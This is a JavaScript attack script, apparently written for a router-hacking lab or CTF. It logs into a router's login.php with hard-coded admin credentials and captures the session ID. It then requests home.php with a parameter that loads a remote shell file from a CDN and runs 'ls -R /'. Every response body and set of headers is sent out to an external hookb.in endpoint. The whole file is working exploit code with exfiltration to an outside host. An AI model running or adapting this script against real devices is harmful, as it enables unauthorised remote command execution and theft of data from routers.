const ROUTER = "http://router.local";
const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";

function forwardResponse(req) {
	let fwdxhr = new XMLHttpRequest();
	fwdxhr.open("POST", ENDPOINT, true);
	fwdxhr.setRequestHeader("Content-Type", "application/json");
	fwdxhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
	const data = JSON.stringify({
		"body": req.response,
		"headers": req.getAllResponseHeaders(),
		"responseURL": req.responseURL,
	});
	fwdxhr.send(data);
}

let xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
	if (xhr.readyState === 4) {
		forwardResponse(xhr);

		const queryString = xhr.responseURL.split('?')[1];
		let queryParams = new URLSearchParams(queryString);
		const sessionId = queryParams.get("PHPSESSID");

		let xhr2 = new XMLHttpRequest();

		xhr2.onreadystatechange = function() {
			if (xhr2.readyState === 4) {
				forwardResponse(xhr2);
			}
		}

		const SHELL = "https://cdn.jsdelivr.net/gh/dspencer12/bobsrouter@0.29/shell";
		const cmd = "ls -R /";

		xhr2.open("GET", ROUTER + "/home.php?action=" + encodeURIComponent(SHELL) + "&x=" + encodeURIComponent(cmd) + "&PHPSESSID=" + sessionId, true);
		xhr2.send('');
	}
}

// Initial request to get main.html
//xhr.open("GET", ROUTER, true);
//xhr.send('');

const formParams = "username=admin&pin=123456";

xhr.open("POST", ROUTER + "/login.php", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send(formParams);
